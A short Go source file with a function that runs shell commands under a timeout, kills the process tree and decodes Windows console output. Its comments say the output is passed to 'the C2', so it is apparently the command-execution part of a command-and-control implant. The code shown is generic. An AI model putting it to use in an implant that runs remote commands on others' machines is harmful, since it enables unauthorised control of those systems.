package main

// Cross-platform shell command execution with a timeout.

import (
	"context"
	"fmt"
	"strings"
	"time"
)

func runCmd(command string, timeout time.Duration) string {
	if strings.TrimSpace(command) == "" {
		return "Error: Empty command"
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := shellCmd(ctx, command)
	// Bound how long Wait blocks on inherited output pipes after the process is
	// killed, so an orphaned grandchild holding stdout cannot wedge the agent.
	cmd.WaitDelay = 5 * time.Second
	// Kill the whole process tree on timeout/cancel (CommandContext alone only
	// kills the direct child).
	cmd.Cancel = func() error { return killTree(cmd) }
	out, err := cmd.CombinedOutput()
	if ctx.Err() == context.DeadlineExceeded {
		return fmt.Sprintf("Error: Command timed out after %d seconds", int(timeout.Seconds()))
	}
	// On Windows the child's pipe output is encoded in the active console/OEM
	// code page, not UTF-8; decode it before handing the bytes to the C2, whose
	// JSON encoder would otherwise turn non-ASCII (e.g. Chinese) into U+FFFD.
	text := strings.TrimRight(string(decodeConsole(out)), "\r\n")
	if err != nil && text == "" {
		return fmt.Sprintf("Error: %v", err)
	}
	if text == "" {
		return "Command executed successfully (no output)"
	}
	return text
}
